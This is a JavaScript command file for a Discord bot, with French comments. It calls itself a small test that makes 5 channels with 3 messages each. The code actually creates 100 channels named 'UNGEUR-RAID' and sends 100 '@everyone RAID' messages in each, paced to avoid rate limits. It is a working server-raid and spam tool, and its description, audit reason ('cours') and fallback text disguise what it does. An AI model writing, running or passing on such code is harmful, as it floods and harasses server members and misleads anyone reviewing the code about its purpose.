const { ChannelType, PermissionFlagsBits } = require('discord.js');

module.exports = {
  prefix: '-',
  name: 'n',
  description: "Crée 5 salons textuels UNGEUR-1..5 et envoie 3 messages dans chacun (avec @everyone)",

  async execute(message, { OWNER_ID }) {
    const dm = async (content) => {
      try { await message.author.send(content); }
      catch (_) { try { await message.reply(content); } catch (_) {} }
    };

    const guild = message.guild;
    if (!guild) return;

    // Autoriser le propriétaire du bot ou ceux qui ont Gérer les salons
    const isOwner = message.author.id === OWNER_ID;
    const hasManage = message.member?.permissions?.has(PermissionFlagsBits.ManageChannels);
    if (!isOwner && !hasManage) {
      return dm("🚫 Tu n’as pas la permission d’utiliser cette commande.");
    }

    // Vérifier les permissions du bot (au niveau guild)
    const me = guild.members.me;
    if (!me) return dm('❌ Impossible de récupérer les informations du bot.');
    if (!me.permissions.has(PermissionFlagsBits.ManageChannels)) {
      return dm('❌ Le bot n’a pas la permission "Gérer les salons".');
    }

    // Liste de noms à créer
    const names = Array.from({ length: 100 }, (_, i) => `UNGEUR-RAID`);
    const createdChannels = [];

    // Création des salons
    for (const name of names) {
      try {
        const ch = await guild.channels.create({
          name,
          type: ChannelType.GuildText,
          reason: 'Créé via -n (cours)'
        });
        createdChannels.push(ch);
      } catch (err) {
        console.error(`Erreur création salon ${name}:`, err);
      }
    }

    if (createdChannels.length === 0) {
      return dm('❌ Aucun salon n’a pu être créé.');
    }

    // Petite fonction utilitaire pour attendre (évite rate-limits brutales)
    const wait = ms => new Promise(res => setTimeout(res, ms));

    let totalSent = 0;
    // Envoyer 3 messages dans chaque salon
    for (const ch of createdChannels) {
      // Vérifier que le bot peut envoyer des messages et mentionner everyone dans ce salon
      const perms = ch.permissionsFor(me);
      if (!perms || !perms.has(PermissionFlagsBits.SendMessages)) {
        console.warn(`Pas la permission d'envoyer des messages dans #${ch.name}`);
        continue;
      }
      const canMentionEveryone = perms.has(PermissionFlagsBits.MentionEveryone);

      for (let i = 0; i < 100; i++) {
        try {
          const content = canMentionEveryone
            ? `@everyone RAID PS: Merci @eldiablo3575`
            : `Message automatique (${i + 1}/3) — Test de diffusion. (le bot n'a pas la permission de mentionner everyone)`;

          await ch.send({
            content,
            allowedMentions: { parse: canMentionEveryone ? ['everyone'] : [] }
          });

          totalSent++;
        } catch (err) {
          console.error(`Erreur en envoyant dans ${ch.name}:`, err);
        }
        // délai entre messages pour limiter les risques de rate limit
        await wait(1000);
      }

      // délai entre salons
      await wait(500);
    }

    return dm(`✅ Terminé : ${createdChannels.length} salons créés, ${totalSent} messages envoyés.`);
  }
};
